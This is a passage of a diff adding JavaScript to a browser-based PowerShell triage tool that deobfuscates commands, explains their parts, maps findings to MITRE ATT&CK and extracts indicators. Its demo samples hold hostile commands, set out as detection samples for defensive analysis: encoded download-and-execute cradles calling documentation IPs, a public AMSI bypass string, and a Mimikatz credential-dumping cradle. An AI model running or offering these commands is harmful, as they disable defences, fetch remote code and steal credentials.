dumping)", "suspicious"], "convertto-securestring": ["builds a SecureString (watch for a hard-coded key)", "notable"], "convertfrom-securestring": ["serialises a SecureString", "notable"], "out-null": ["discards output (hides results)", "info"], "out-file": ["writes output to a file", "info"], "get-childitem": ["lists files/registry entries", "info"], "gci": ["Get-ChildItem: lists files/registry entries", "info"], "get-content": ["reads file content", "info"], "gc": ["Get-Content: reads file content", "info"], "where-object": ["filters objects", "info"], "foreach-object": ["iterates over objects", "info"], "stop-process": ["terminates a process", "notable"], "get-process": ["lists processes", "info"], "downloadstring": ["downloads URL content into memory as a string", "suspicious"]};
+const EX_METHODS={"downloadstring": ["downloads URL content into memory as a string", "suspicious"], "downloadfile": ["downloads a URL to a file on disk", "suspicious"], "downloaddata": ["downloads URL content as raw bytes", "suspicious"], "openread": ["opens a readable remote stream", "notable"], "uploadstring": ["sends data to a remote URL (possible exfiltration)", "suspicious"], "uploadfile": ["uploads a file to a remote URL (possible exfiltration)", "suspicious"], "create": ["constructs an object from the input (e.g. a scriptblock from a string)", "notable"], "invoke": ["executes the target (scriptblock, method, or delegate)", "notable"], "invokereturnasis": ["executes the target and returns the result", "suspicious"], "frombase64string": ["decodes base64 text into bytes", "notable"], "tobase64string": ["encodes bytes as base64 text", "info"], "getstring": ["decodes bytes into text", "info"], "getbytes": ["encodes text into bytes", "info"], "load": ["loads a .NET assembly (in-memory / reflective load)", "suspicious"], "loadfile": ["loads a .NET assembly from a path", "suspicious"], "loadwithpartialname": ["loads a .NET assembly by name", "notable"], "gettype": ["reflection: resolves a type", "notable"], "getmethod": ["reflection: reaches a method (often non-public)", "suspicious"], "getfield": ["reflection: reaches a field (often non-public)", "suspicious"], "getproperty": ["reflection: reaches a property", "notable"], "setvalue": ["reflection: sets a field/property value", "suspicious"], "invokemember": ["reflection: invokes a member dynamically", "suspicious"], "getdelegatefortype": ["creates a callable delegate (native code execution)", "suspicious"], "getprocaddress": ["resolves a native function address (API hooking/shellcode)", "suspicious"], "virtualalloc": ["allocates memory, often executable (shellcode)", "suspicious"], "createthread": ["starts a thread, often on shellcode", "suspicious"], "readtoend": ["reads a stream to the end", "info"], "getnewclosure": ["captures a scriptblock as a closure (execution)", "suspicious"], "start": ["starts the object (process / transfer)", "notable"], "replace": ["replaces text (can rebuild obfuscated strings)", "notable"], "split": ["splits a string", "info"]};
+const EX_TYPES={"convert": ["[Convert]: base64 / numeric conversions", "info"], "encoding": ["text <-> byte encoding", "info"], "webclient": ["HTTP client object (download cradle)", "suspicious"], "webrequest": ["HTTP request object", "notable"], "memorystream": ["in-memory byte buffer", "info"], "gzipstream": ["gzip (de)compression stream", "notable"], "deflatestream": ["deflate (de)compression stream", "notable"], "streamreader": ["reads a stream into text", "info"], "assembly": ["[Reflection.Assembly]: runtime assembly loading (fileless .NET)", "suspicious"], "scriptblock": ["PowerShell code as an object; ::Create builds one from a string", "suspicious"], "amsiutils": ["internal AMSI object (tamper target)", "suspicious"], "marshal": ["native interop: memory, pointers, function pointers (shellcode)", "suspicious"], "ref": ["[Ref]: used to reach internal fields (e.g. AMSI bypass)", "suspicious"], "char": ["character cast (often string obfuscation)", "notable"], "text": ["System.Text namespace (encoding)", "info"], "file": ["file read/write", "info"], "process": ["process control", "notable"], "runtime": ["runtime / interop services", "notable"], "bitconverter": ["byte <-> value conversions", "info"], "intptr": ["native pointer type", "notable"], "diagnostics": ["System.Diagnostics (process/eventlog control)", "notable"]};
+const EX_PARAMS={"-encodedcommand": ["runs a base64/UTF-16LE-encoded script (hides the command line)", "suspicious"], "-enc": ["runs a base64/UTF-16LE-encoded script (hides the command line)", "suspicious"], "-e": ["(-EncodedCommand) runs a base64-encoded script", "suspicious"], "-ec": ["runs a base64-encoded script", "suspicious"], "-noprofile": ["skips the user profile (automation/stealth)", "notable"], "-nop": ["(-NoProfile) skips the user profile (automation/stealth)", "notable"], "-windowstyle": ["controls window visibility", "notable"], "-w": ["(-WindowStyle) controls window visibility ('hidden' => no window)", "notable"], "-executionpolicy": ["sets execution policy for this process", "notable"], "-ep": ["(-ExecutionPolicy) sets execution policy ('bypass' disables it)", "notable"], "-exec": ["(-ExecutionPolicy) sets execution policy ('bypass' disables it)", "notable"], "-noninteractive": ["suppresses interactive prompts (automation)", "notable"], "-noni": ["(-NonInteractive) suppresses prompts (automation)", "notable"], "-command": ["runs the following command text", "info"], "-c": ["(-Command) runs the following command text", "info"], "-file": ["runs the specified script file", "info"], "-nologo": ["hides the banner", "info"], "-sta": ["single-threaded apartment mode", "info"], "-hidden": ["value 'hidden' (no window)", "notable"], "-outfile": ["writes the response to a file", "info"], "-uri": ["target URL", "info"], "-usebasicparsing": ["avoids the IE engine when fetching (headless)", "info"]};
+const EX_OPERATORS={"-f": ["format operator: templates a string (used to reorder/hide keywords)", "notable"], "-join": ["joins array elements into a string (often rebuilds hidden strings)", "notable"], "-split": ["splits a string into parts", "info"], "-replace": ["regex replace (can rebuild/deobfuscate strings)", "notable"], "-as": ["casts to a type", "info"], "-bxor": ["bitwise XOR (commonly decrypts payloads)", "suspicious"], "-band": ["bitwise AND", "notable"], "-bor": ["bitwise OR", "notable"], "-eq": ["equals comparison", "info"], "-ne": ["not-equal comparison", "info"], "-match": ["regex match", "info"], "-like": ["wildcard match", "info"], "-contains": ["membership test", "info"], "-in": ["membership test", "info"], "-and": ["logical AND", "info"], "-or": ["logical OR", "info"], "-not": ["logical NOT", "info"]};
+const EX_VARS={"$_": ["the current pipeline object", "info"], "$psitem": ["the current pipeline object", "info"], "$args": ["arguments passed to the script/block", "info"], "$null": ["the null value ('Out-Null' / '> $null' discards output)", "info"], "$true": ["boolean true", "info"], "$false": ["boolean false", "info"], "$host": ["the host application object", "info"], "$executioncontext": ["the runtime context (sometimes abused for AMSI)", "notable"], "$psversiontable": ["PowerShell version info (often a downgrade check)", "notable"]};
+const EX_LOLBIN={"rundll32": ["runs code via rundll32 (LOLBin, often proxy execution)", "suspicious"], "regsvr32": ["runs code via regsvr32 (LOLBin, scriptlet execution)", "suspicious"], "mshta": ["runs HTA/scriptlet content via mshta (LOLBin)", "suspicious"], "certutil": ["certutil (often abused to download or decode payloads)", "suspicious"], "bitsadmin": ["BITS download (LOLBin)", "notable"], "wmic": ["WMI command-line (execution / lateral movement)", "notable"], "gwmi": ["Get-WmiObject: queries WMI", "info"], "iwmi": ["Invoke-WmiMethod: invokes a WMI method (execution)", "notable"], "sls": ["Select-String: searches text", "info"], "whoami": ["prints the current user (discovery)", "info"], "net": ["net.exe (accounts/shares/groups - discovery or manipulation)", "notable"], "netstat": ["lists network connections (discovery)", "info"], "nltest": ["domain trust enumeration (discovery)", "notable"], "systeminfo": ["host configuration (discovery)", "info"], "tasklist": ["lists running processes (discovery)", "info"], "cmd": ["cmd.exe shell", "notable"], "ps": ["Get-Process: lists processes", "info"], "kill": ["Stop-Process: terminates a process", "notable"], "gm": ["Get-Member: inspects object members", "info"]};
+/* ---- component breakdown: pull each part apart and say what it does ---- */
+const EX_TOK = /(?<comment>#[^\r\n]*)|(?<sstr>'(?:[^']|'')*')|(?<dstr>"(?:[^"`]|`.)*")|(?<typemethod>\[[\w.]+(?:\[\])?\]\s*::\s*\w+)|(?<typelit>\[[\w.]+(?:\[\])?\])|(?<cmdlet>[A-Za-z]\w*-[A-Za-z]\w*)|(?<alias>\b(?:iex|irm|iwr|icm|gc|gci|gcm|gm|gwmi|iwmi|sal|nal|saps|spps|ipmo|ps|kill|sls|curl|wget|rundll32|regsvr32|mshta|certutil|bitsadmin|wmic|cmd|whoami|net|netstat|nltest|systeminfo|tasklist)\b(?!\.))|(?<method>\.\s*\w+(?=\s*\())|(?<member>\.\s*\w+)|(?<varr>\$(?:env|global|script|local|using)\s*:\s*\w+|\$\{[^}]+\}|\$[A-Za-z_]\w*|\$[_?^$])|(?<flagop>-[A-Za-z]\w*)|(?<hashopen>@\{)|(?<arropen>@\()|(?<subexpr>\$\()|(?<pipe>\|)|(?<semi>;)|(?<amp>&)|(?<backtick>`)|(?<redirect>2>&1|>>|>)|(?<assign>=)/gi;
+function exExcerpt(s,n){ n=n||60; s=String(s).replace(/[\r\n]+/g," "); return s.length<=n?s:s.slice(0,n)+" ..."; }
+function exAnnotate(kind,text){
+  const t=text.trim(), low=t.toLowerCase();
+  if(kind==="comment") return ["comment / operator annotation","info"];
+  if(kind==="sstr"||kind==="dstr"){
+    const inner=t.slice(1,-1);
+    if(/https?:\/\//i.test(inner)) return ["string literal containing a URL","notable"];
+    if(kind==="dstr"&&(inner.includes("$(")||/\$\w/.test(inner))) return ["expandable string (interpolates variables / subexpressions)","info"];
+    return ["string literal","info"];
+  }
+  if(kind==="typemethod"){
+    const m=t.match(/\[([\w.]+)(?:\[\])?\]\s*::\s*(\w+)/);
+    const typ=m?m[1].split(".").pop().toLowerCase():"", meth=m?m[2].toLowerCase():"";
+    const td=EX_TYPES[typ], md=EX_METHODS[meth], parts=[];
+    if(td)parts.push(td[0]); if(md)parts.push(md[0]); if(!parts.length)parts.push("static call "+t);
+    const con=((td&&td[1]==="suspicious")||(md&&md[1]==="suspicious"))?"suspicious":(((td&&td[1]==="notable")||(md&&md[1]==="notable"))?"notable":"info");
+    return [parts.join(" - "),con];
+  }
+  if(kind==="typelit"){ const typ=t.replace(/[\[\]]/g,"").split(".").pop().toLowerCase(); return EX_TYPES[typ]||[".NET type "+t,"info"]; }
+  if(kind==="cmdlet"||kind==="alias"){
+    if(EX_CMDLETS[low]) return EX_CMDLETS[low];
+    if(EX_LOLBIN[low]) return EX_LOLBIN[low];
+    const verb=low.split("-")[0], noun=t.includes("-")?t.split(/-(.+)/)[1]:"", vg=EX_VERBS[verb];
+    return vg?[(vg+" "+(noun||"")).trim(),"info"]:["cmdlet/function "+t,"info"];
+  }
+  if(kind==="method"){ const w=low.replace(/[.\s]/g,""); return EX_METHODS[w]||["method call ."+t.replace(/[.\s]/g,"")+"()","info"]; }
+  if(kind==="member"){ const w=low.replace(/[.\s]/g,""); return EX_METHODS[w]||EX_TYPES[w]||["member/property ."+t.replace(/[.\s]/g,""),"info"]; }
+  if(kind==="varr"){ const base=low.replace(/\s/g,""); if(base.startsWith("$env:")) return ["environment variable "+t+" (e.g. a staging path)","notable"]; return EX_VARS[base]||["variable "+t,"info"]; }
+  if(kind==="flagop"){ return EX_OPERATORS[low]||EX_PARAMS[low]||["parameter/switch "+t,"info"]; }
+  const struct={hashopen:["hashtable literal @{ } (key/value pairs)","info"],arropen:["array subexpression @( )","info"],subexpr:["subexpression $( ) - evaluates code inline","notable"],pipe:["pipeline: sends output to the next command","info"],semi:["statement separator","info"],amp:["call operator & : invokes a command/scriptblock","notable"],backtick:["backtick: escape / line-continuation (also used to split identifiers)","notable"],redirect:["output redirection","info"],assign:["assignment: stores the value in the variable","info"]};
+  return struct[kind]||[kind,"info"];
+}
+function explain(cmd,limit){
+  limit=limit||140;
+  const clean=cmd.replace(/\/\*\[decoded:[^\]]*\]\*\//g,"");
+  const segs=[];
+  for(const m of clean.matchAll(EX_TOK)){
+    let kind=null; const g=m.groups; for(const k in g){ if(g[k]!==undefined){kind=k;break;} }
+    const text=m[0]; if(!text.trim()) continue;
+    const a=exAnnotate(kind,text);
+    segs.push({text:exExcerpt(text),kind,desc:a[0],concern:a[1]});
+    if(segs.length>=limit) break;
+  }
+  return segs;
+}
+function refang(s){
+  return s.replace(/\[\.\]|\(\.\)|\{\.\}|\[dot\]|\(dot\)/gi,".")
+          .replace(/hxxp(s?):\/\//gi,"http$1://")
+          .replace(/\[:\]/g,":").replace(/\[\/\]/g,"/").replace(/\[@\]/g,"@");
+}
+function obfFindings(original, final){
+  const ticks=(original.match(/`/g)||[]).length, caret=(original.match(/\^/g)||[]).length;
+  const base=(final&&final!==original)?final:original, n=base.length||1;
+  let symbols=0; for(const c of "{}[]()`^+%") symbols+=base.split(c).length-1;
+  const ratio=symbols/n, plus=(base.match(/\+/g)||[]).length, reasons=[];
+  if(ticks>=3) reasons.push(ticks+" backticks");
+  if(caret>=3) reasons.push(caret+" carets");
+  if(plus>=6) reasons.push(plus+" '+' concatenations");
+  if(n>=40 && ratio>=0.28) reasons.push("symbol density "+Math.round(ratio*100)+"%");
+  if(!reasons.length) return [];
+  const sev=(ratio>=0.35||ticks>=6||caret>=6||plus>=12)?"medium":"low";
+  return [{id:"OBF-DENSITY",name:"High obfuscation-character density",cat:"obfuscation",sev,mitre:["T1027.010"],
+    desc:"Unusually high proportion of escape/splitting characters ("+reasons.join(", ")+") - a strong sign of mechanical obfuscation (e.g. Invoke-Obfuscation) even when no single layer statically resolves.",
+    matched:reasons.slice(0,3)}];
+}
+const KNOWN_INSTALLERS=/community\.chocolatey\.org|chocolatey\.org\/install|get\.scoop\.sh|raw\.githubusercontent\.com\/[^'"]*install\.ps1/i;
+function installerNote(hay){
+  if(KNOWN_INSTALLERS.test(hay)) return [{id:"CTX-INSTALLER",name:"Resembles a known software-installer bootstrap",cat:"context",sev:"info",mitre:[],
+    desc:"A URL associated with common legitimate installers (e.g. Chocolatey/Scoop) is present. The download-and-execute pattern may be benign here - verify the exact domain and context before escalating.",matched:[]}];
+  return [];
+}
+function correlate(hay){
+  const low=hay.toLowerCase(); const extra=[];
+  const fetch=["downloadstring","downloadfile","downloaddata","net.webclient",
+    "invoke-webrequest","invoke-restmethod"].some(k=>low.includes(k)) || /\b(irm|iwr)\b/.test(low);
+  const execp=["iex","invoke-expression","scriptblock]::create","new-module",".getnewclosure"]
+    .some(k=>low.includes(k));
+  if(fetch && execp){
+    extra.push({id:"COMBO-CRADLE",name:"Remote download + dynamic execution (cradle)",
+      cat:"execution",sev:"high",mitre:["T1105","T1059.001"],
+      desc:"A remote fetch feeds directly into dynamic code execution - a download-and-execute cradle. "+
+           "This composition is the defining behaviour of a fileless loader and should be treated as "+
+           "malicious barring a specific known-good justification.",
+      matched:["fetch + dynamic-exec composition"]});
+  }
+  return extra;
+}
+async function analyze(cmd){
+  const norm=refang(cmd);
+  const {final,steps,layers}=await deobfuscate(norm);
+  const hay=norm+"\n"+final;
+  const findings=matchRules(hay).concat(correlate(hay)).concat(obfFindings(norm,final)).concat(installerNote(hay));
+  const iocs=extractIOCs(hay);
+  const mitre=[...new Set(findings.flatMap(f=>f.mitre))].sort();
+  const score=findings.reduce((a,f)=>a+SEV_WEIGHT[f.sev],0);
+  const [vtext,vsev]=verdict(score);
+  let sha=""; try{ sha=await sha256hex(cmd); }catch(e){ sha="(unavailable)"; }
+  let segments=[]; try{ segments=explain(final); }catch(e){}
+  return {original:cmd, final, steps, layers, segments, findings, iocs, mitre, score, vtext, vsev,
+          sha, len:cmd.length, ts:new Date().toISOString().replace("T"," ").slice(0,19)+"Z"};
+}
+
+/* ---- safe DOM builder (textContent only; never innerHTML) ------------- */
+function el(tag, attrs, ...kids){
+  const n=document.createElement(tag);
+  if(attrs) for(const [k,v] of Object.entries(attrs)){
+    if(k==="class") n.className=v; else n.setAttribute(k,v);
+  }
+  for(const kid of kids){
+    if(kid==null) continue;
+    n.appendChild(typeof kid==="string"?document.createTextNode(kid):kid);
+  }
+  return n;
+}
+function defang(s){ return s.replace(/https?/gi,m=>m.toLowerCase()==="https"?"hxxps":"hxxp").replace(/\./g,"[.]"); }
+
+const SEV_ORDER={critical:0,high:1,medium:2,low:3,info:4};
+let lastReportText="";
+
+function render(rep){
+  const doDefang=document.getElementById("defang").checked;
+  const out=document.getElementById("out");
+  out.textContent=""; out.style.display="block";
+
+  // verdict
+  const v=el("div",{class:"verdict"},
+      el("span",{class:"score"},"risk score "+rep.score),
+      el("b",{class:"c-"+rep.vsev},rep.vtext));
+  v.style.borderLeft="4px solid var(--"+rep.vsev+")";
+  out.appendChild(v);
+
+  // original
+  const s1=el("section",{class:"blk"}, el("h2",null,"Original command"),
+      el("pre",{class:"code"}, rep.original.trim()));
+  out.appendChild(s1);
+
+  // deobfuscation trail (one step per transform)
+  if(rep.steps.length){
+    const s=el("section",{class:"blk"},
+      el("h2",null,`Deobfuscation trail · ${rep.steps.length} step(s), ${rep.layers} layer(s)`));
+    for(const st of rep.steps){
+      const card=el("div",{class:"finding sev-low"});
+      card.appendChild(el("div",{class:"top"},
+        el("span",{class:"sev bg-low"}, "#"+st.n),
+        el("span",{class:"nm"}, st.tech),
+        el("span",{class:"meta"}, "L"+st.layer+" · "+st.mitre+" · "+st.detail)));
+      card.appendChild(el("pre",{class:"code"}, "before: "+st.before+"\nafter : "+st.after));
+      s.appendChild(card);
+    }
+    s.appendChild(el("div",{class:"note"},"– fully deobfuscated:"));
+    s.appendChild(el("pre",{class:"code"}, rep.final.trim()));
+    out.appendChild(s);
+  }
+
+  // component breakdown
+  if(rep.segments && rep.segments.length){
+    const cmap={suspicious:"high",notable:"medium",info:"low"};
+    const bd={suspicious:"!!",notable:"*",info:"·"};
+    const s=el("section",{class:"blk"}, el("h2",null,"Component breakdown · what each part does"));
+    for(const seg of rep.segments){
+      const c=cmap[seg.concern]||"low";
+      const row=el("div",{class:"finding sev-"+c});
+      row.appendChild(el("div",{class:"top"},
+        el("span",{class:"sev bg-"+c}, bd[seg.concern]||"·"),
+        el("code",{class:"nm"}, seg.text)));
+      row.appendChild(el("div",{class:"desc"}, seg.desc));
+      s.appendChild(row);
+    }
+    out.appendChild(s);
+  }
+
+  // findings
+  const sf=el("section",{class:"blk"}, el("h2",null,"Findings"));
+  if(rep.findings.length){
+    const sorted=[...rep.findings].sort((a,b)=>(SEV_ORDER[a.sev]??9)-(SEV_ORDER[b.sev]??9));
+    for(const f of sorted){
+      const card=el("div",{class:"finding sev-"+f.sev});
+      card.appendChild(el("div",{class:"top"},
+        el("span",{class:"sev bg-"+f.sev}, f.sev.toUpperCase()),
+        el("span",{class:"nm"}, f.name),
+        el("span",{class:"meta"}, f.cat+" · "+(f.mitre.join(" ")||"-"))));
+      card.appendChild(el("div",{class:"desc"}, f.desc));
+      if(f.matched.length) card.appendChild(el("div",{class:"matched"}, "matched: "+f.matched.join("  |  ")));
+      sf.appendChild(card);
+    }
+  } else { sf.appendChild(el("div",{class:"empty"},"none")); }
+  out.appendChild(sf);
+
+  // iocs
+  const si=el("section",{class:"blk"}, el("h2",null,"Indicators"+(doDefang?" (defanged)":"")));
+  const keys=Object.keys(rep.iocs);
+  if(keys.length){
+    const tbl=el("table",{class:"ioc"});
+    for(const k of keys){
+      const vals=rep.iocs[k].map(x=>doDefang?defang(x):x).join("\n");
+      const tr=el("tr", null, el("td",{class:"k"},k), el("td",{class:"v"},
+        el("span",{style:"white-space:pre-wrap"}, vals)));
+      tbl.appendChild(tr);
+    }
+    si.appendChild(tbl);
+  } else { si.appendChild(el("div",{class:"empty"},"none extracted")); }
+  out.appendChild(si);
+
+  // mitre (union of finding techniques + obfuscation-step techniques)
+  const techs=[...new Set([...rep.mitre, ...rep.steps.map(s=>s.mitre)])].sort();
+  if(techs.length){
+    const sm=el("section",{class:"blk"}, el("h2",null,"MITRE ATT&CK"));
+    for(const t of techs){
+      const meta=ATTACK[t]||["(unmapped)","-"];
+      sm.appendChild(el("div",{class:"note"}, el("span",{class:"att"}, t), " "+meta[0]+" — "+meta[1]));
+    }
+    out.appendChild(sm);
+  }
+
+  buildReportMarkdown(rep, doDefang);
+  document.getElementById("copy").style.display="inline-block";
+}
+
+function mdc(s){ return String(s).replace(/\|/g,"\\|").replace(/[\r\n]+/g," "); }
+function buildReportMarkdown(rep, doDefang){
+  const label=(document.getElementById("label").value.trim())||"pasted command";
+  const L=[];
+  L.push("# PowerShell Command Analysis — "+label);
+  L.push("");
+  L.push("> **Static heuristic triage. The command was NOT executed.** For nested or novel "+
+         "obfuscation, corroborate with PowerShell Script Block Logging (Event ID 4104) or an "+
+         "isolated dynamic detonation.");
+  L.push("");
+  L.push("## 1. Evidence"); L.push("");
+  L.push("| Field | Value |"); L.push("|---|---|");
+  L.push("| Artifact / source | "+mdc(label)+" |");
+  L.push("| SHA-256 (analyzed text) | `"+rep.sha+"` |");
+  L.push("| Length | "+rep.len+" chars |");
+  L.push("| Analyzed (UTC) | "+rep.ts+" |");
+  L.push("| Tool | psparse.html 2.0 |");
+  L.push("");
+  L.push("## 2. Verdict"); L.push("");
+  L.push("> **"+rep.vtext+"** — risk score **"+rep.score+"**"); L.push("");
+  L.push("## 3. Original command"); L.push("");
+  L.push("```powershell"); L.push(rep.original.trim()); L.push("```"); L.push("");
+  L.push("## 4. Deobfuscation trail"); L.push("");
+  if(rep.steps.length){
+    L.push(rep.steps.length+" transformation(s) across "+rep.layers+" layer(s):"); L.push("");
+    L.push("| # | Layer | Technique | ATT&CK | Detail |"); L.push("|---|---|---|---|---|");
+    rep.steps.forEach(s=>L.push(`| ${s.n} | ${s.layer} | ${mdc(s.tech)} | ${s.mitre} | ${mdc(s.detail)} |`));
+    L.push(""); L.push("Per-step before / after:"); L.push("");
+    rep.steps.forEach(s=>{ L.push("**Step "+s.n+" — "+mdc(s.tech)+"**"); L.push("");
+      L.push("```text"); L.push("before: "+s.before); L.push("after : "+s.after); L.push("```"); L.push(""); });
+    L.push("Fully deobfuscated:"); L.push("");
+    L.push("```powershell"); L.push(rep.final.trim()); L.push("```");
+  } else { L.push("_No obfuscation layers detected; the command was analyzed as-is._"); }
+  L.push("");
+  L.push("## 5. Component breakdown"); L.push("");
+  if(rep.segments && rep.segments.length){
+    L.push("Each recognised part of the (deobfuscated) command and what it does. `!!` = security-relevant, `*` = noteworthy."); L.push("");
+    L.push("| | Fragment | What it does |"); L.push("|---|---|---|");
+    const fl={suspicious:"!!",notable:"*",info:""};
+    rep.segments.forEach(s=>L.push("| "+(fl[s.concern]||"")+" | `"+mdc(s.text)+"` | "+mdc(s.desc)+" |"));
+  } else { L.push("_No components parsed._"); }
+  L.push("");
+  L.push("## 6. Findings"); L.push("");
+  if(rep.findings.length){
+    const sorted=[...rep.findings].sort((a,b)=>(SEV_ORDER[a.sev]??9)-(SEV_ORDER[b.sev]??9));
+    L.push("| Severity | ID | Name | Category | ATT&CK | Matched |"); L.push("|---|---|---|---|---|---|");
+    sorted.forEach(f=>L.push(`| ${f.sev.toUpperCase()} | ${f.id} | ${mdc(f.name)} | ${f.cat} | `+
+      `${f.mitre.join(" ")||"-"} | ${mdc(f.matched.join(", "))} |`));
+  } else { L.push("_None._"); }
+  L.push("");
+  L.push("## 7. Indicators of compromise"); L.push("");
+  const keys=Object.keys(rep.iocs);
+  if(keys.length){
+    L.push("_URLs / hosts defanged for safe handling._"); L.push("");
+    L.push("| Type | Value |"); L.push("|---|---|");
+    keys.forEach(k=>rep.iocs[k].forEach(v=>L.push("| "+k+" | `"+mdc(doDefang?defang(v):v)+"` |")));
+  } else { L.push("_None extracted._"); }
+  L.push("");
+  L.push("## 8. MITRE ATT&CK techniques"); L.push("");
+  const techs=[...new Set([...rep.mitre, ...rep.steps.map(s=>s.mitre)])].sort();
+  if(techs.length){
+    L.push("| ID | Technique | Tactic |"); L.push("|---|---|---|");
+    techs.forEach(t=>{ const m=ATTACK[t]||["(unmapped)","-"]; L.push(`| ${t} | ${mdc(m[0])} | ${mdc(m[1])} |`); });
+  } else { L.push("_None._"); }
+  L.push("");
+  L.push("## 9. Analyst notes & limitations"); L.push("");
+  L.push("- Output is **static, heuristic triage**; the command was never executed.");
+  L.push("- Static deobfuscation can be defeated by novel or heavily nested obfuscation "+
+         "(SecureString, environment-variable indirection, runtime string assembly). "+
+         "The ground truth is the deobfuscated block logged by **Event ID 4104**.");
+  L.push("- The risk score is an ordinal triage aid, not a probability.");
+  L.push("- Extracted indicators are defanged and should be validated before any blocking action.");
+  L.push("");
+  lastReportText=L.join("\n");
+}
+
+/* ---- wiring ----------------------------------------------------------- */
+const cmdEl=document.getElementById("cmd");
+const lenEl=document.getElementById("len");
+function updLen(){ const n=cmdEl.value.length;
+  lenEl.textContent=n?`${n.toLocaleString()} chars${n>MAX_INPUT?" — will be truncated":""}`:""; }
+cmdEl.addEventListener("input",updLen);
+
+document.getElementById("run").addEventListener("click",async()=>{
+  let cmd=cmdEl.value; if(!cmd.trim()) return;
+  if(cmd.length>MAX_INPUT) cmd=cmd.slice(0,MAX_INPUT);
+  const btn=document.getElementById("run"); btn.disabled=true; btn.textContent="Analyzing…";
+  try{ render(await analyze(cmd)); }
+  catch(e){
+    const out=document.getElementById("out"); out.style.display="block"; out.textContent="";
+    out.appendChild(el("div",{class:"verdict"}, el("b",null,"Analysis error: "), String(e&&e.message||e)));
+  }
+  finally{ btn.disabled=false; btn.textContent="Analyze"; }
+});
+document.getElementById("clear").addEventListener("click",()=>{
+  cmdEl.value=""; updLen(); document.getElementById("out").style.display="none";
+  document.getElementById("copy").style.display="none"; cmdEl.focus();
+});
+document.getElementById("copy").addEventListener("click",async()=>{
+  try{ await navigator.clipboard.writeText(lastReportText);
+       const b=document.getElementById("copy"); const t=b.textContent; b.textContent="Copied";
+       setTimeout(()=>b.textContent=t,1200); }catch(e){}
+});
+
+/* ---- inert demo samples (RFC5737 doc IPs / .example hosts; no live payloads) ---- */
+const SAMPLES=[
+  {label:"benign-01 \u2014 Admin: find large log files", cmd:"Get-ChildItem -Path C:\\Logs -Recurse | Where-Object {$_.Length -gt 1MB} | Sort-Object Length -Descending"},
+  {label:"enc-cmd-01 \u2014 Encoded command download cradle", cmd:"powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADEAMAAvAHMAdABhAGcAZQAyAC4AcABzADEAJwApAA=="},
+  {label:"gzip-01 \u2014 Gzip + base64 in-memory unpack", cmd:"$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAExmrmoC//N0jVDQ8Est1/VPykpNLlHwSy3RC09Ncs7JTM0r0dRzyS/Py8lPTAkuKcrMS9dQzygpKbDS1ze0NNIz0DPSMzTQLy5JTE810isoNlTXBAAbXNI/TQAAAA=='));IEX(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"},
+  {label:"reverse-01 \u2014 Reversed-literal cradle", cmd:"$m='gnirtSdaolnwoD'[-1..-14] -join '';(New-Object Net.WebClient).$m('http://192.0.2.44/b')"},
+  {label:"nested-01 \u2014 Multi-layer: encoded > backtick > format", cmd:"powershell -nop -w hidden -enc aQBgAGUAYAB4ACAAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgAoACcAewAxAH0AewAwAH0AJwAgAC0AZgAgACcAUwB0AHIAaQBuAGcAJwAsACcARABvAHcAbgBsAG8AYQBkACcAKQAuAEkAbgB2AG8AawBlACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMAAuADIALgAxADAALwBmAGkAbgBhAGwALgBwAHMAMQAnACkAKQA="},
+  {label:"amsi-01 \u2014 AMSI bypass (canonical public string)", cmd:"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"},
+  {label:"mimikatz-01 \u2014 Mimikatz signature", cmd:"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.99/im.ps1'); Invoke-Mimikatz -DumpCreds"}
+];
+(function(){
+  const sel=document.getElementById("sample");
+  SAMPLES.forEach((s,i)=>sel.appendChild(el("option",{value:String(i)}, s.label)));
+  sel.addEventListener("change",()=>{
+    const i=sel.value; if(i==="") return;
+    const s=SAMPLES[+i];
+    cmdEl.value=s.cmd; updLen();
+    document.getElementById("label").value=s.label;
+    document.getElementById("run").click();
+    sel.value="";
+  });
+})();
+
+/* footer built as text nodes */
+(function(){
+  const f=document.getElementById("foot");
+  f.appendChild(el("div",null,"Runs entirely in your browser. No network, no storage — the page cannot send what you paste anywhere (enforced by Content-Security-Policy)."));
+  f.appendChild(el("div",null,"Static heuristic triage only; it never executes the command. Novel/nested obfuscation can defeat it — corroborate with Script Block Logging (EID 4104) or isolated dynamic detonation."));
+  f.appendChild(el("div",null,"Extend the RULES array in this file to add campaign- or actor-specific signatures."));
+})();
+
+/* show 'offline' as green only if truly no controlled server involved (file://) */
+if(location.protocol!=="file:"){ const o=document.getElementById("offlineflag");
+  o.textContent="● hosted — for live cases prefer a local copy"; o.style.color="var(--high)"; }
+</script>
+</body>
+</html>
